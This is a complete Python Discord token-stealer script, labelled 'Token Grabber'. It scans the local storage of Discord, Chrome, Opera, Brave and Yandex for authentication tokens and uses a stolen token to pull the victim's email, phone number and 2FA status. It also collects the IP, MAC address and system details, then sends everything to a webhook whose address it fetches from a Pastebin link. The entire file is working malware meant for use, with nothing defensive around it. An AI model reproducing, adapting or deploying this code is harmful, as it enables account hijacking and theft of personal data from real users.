import aiohttp, aiofiles, asyncio, os, re, platform, uuid, psutil, base64
from discord_webhook import DiscordWebhook, DiscordEmbed

# Only thing that needs editing is this
PASTEBIN_URL = "https://pastebin.com/raw/8RinP9dM"

# Grab the webhook url
async def get_webhook_url(URL):
    async with aiohttp.ClientSession() as session:
        make_req = await session.get(URL)
        response = await make_req.text()
        # Now we need to decode the base64 webhook url
        decode_url = base64.b64decode(response)
        webhook_url = str(decode_url, "utf-8")
        return webhook_url

# Gets all the tokens on the users computer.
async def get_tokens():
    localappdata = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': os.path.join(roaming, 'Discord'),
        'Discord Canary': os.path.join(roaming, 'DiscordCanary'),
        'Discord PTB': os.path.join(roaming, 'DiscordPTB'),
        'Google Chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'Brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Yandex': os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
    }
    tokens = []

    for platform, path in paths.items():
        path = os.path.join(path, 'Local Storage', 'leveldb')

        if os.path.exists(path) is False:
            continue

        for item in os.listdir(path):
            if (item[-4:] in ('.log', '.ldb')) is False:
                continue

            with open(os.path.join(path, item), errors='ignore', encoding='utf-8') as file:
                lines = file.readlines()

            for line in lines:
                line = line.strip()

                if line == "":
                    continue

                for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                    if token in tokens:
                        continue

                    tokens.append(token)
    return tokens

# Gets profile details
async def get_profile(token):
    # Hit discord profile endpoint so we can get some things that we can send back over to the webhook
    url = "https://discordapp.com/api/v7/users/@me"
    headers = {
        "Authorization": str(token)
    }
    async with aiohttp.ClientSession() as profile_session:
        send_req = await profile_session.get(url, headers=headers)
        response = await send_req.json()
        # Create a dictionary with our key values so we can send them to the webhook url later on
        profile = {
            "username": f"{response['username']}#{response['discriminator']}",
            "email": response["email"],
            "verified": response["verified"],
            "2fa": response["mfa_enabled"], 
            "phone": response["phone"]
        }
        return profile

# Grabs users ip address.
async def get_computer_info():
    async with aiohttp.ClientSession() as session:
        # We use httpbin so it aint gonna go down like other sites do...
        send_req = await session.get("https://httpbin.org/ip")
        response = await send_req.json()
        ip_addr = response["origin"]

        pc_stuff = {
            "hostname": os.environ.get("COMPUTERNAME"),
            "ip_address": ip_addr,
            "platform": f"{platform.system()} {platform.release()}",
            "device_arch": platform.machine(),
            "machine_processer": platform.processor(),
            "mac_address": ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            "ram": str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        }
        return pc_stuff

async def main():
    # Our main functionc
    webhook_url = await get_webhook_url(PASTEBIN_URL)
    user_token = await get_tokens()
    user_data = await get_profile(user_token[0])
    computer_info = await get_computer_info()
    
    twofa = ""
    if user_data['2fa'] == True:
        twofa = "✅"
    else:
        twofa = "❌"
    
    verified_status = ""
    if user_data['verified'] == True:
        verified_status = "✅"
    else:
        verified_status = "❌"

    has_number = ""
    if user_data['phone'] == None:
        has_number = '❌'
    else:
        has_number = user_data['phone']


    webhook = DiscordWebhook(url=webhook_url, username="Token Grabber")
    embed = DiscordEmbed(
    title="Token Grabber", color=16580705
    )
    embed.set_timestamp()
    embed.add_embed_field(name="`Tokens`", value=f"""**[Newest Token]: **`{user_token[0]}`""", inline=False)
    
    embed.add_embed_field(name="`Profile`", value=f"""
**Username:** {user_data['username']}
**Email:** {user_data['email']}
**Phone Number:** {has_number}
**Email Verified:** {verified_status}
**2 Factor Enabled:** {twofa}
""", inline=False)
    
    embed.add_embed_field(name="`PC Information`", value=f"""
**Computer Name:** {computer_info['hostname']}
**IP Address:** {computer_info['ip_address']}
**Operating System:** {computer_info['platform']}
**Device Architecture:** {computer_info['device_arch']}
**Processor:** {computer_info['machine_processer']}
**Computer RAM:** {computer_info['ram']}
**Mac Address:** {computer_info['mac_address']}
    """, inline=False)
    webhook.add_embed(embed)
    response = webhook.execute()


asyncio.run(main())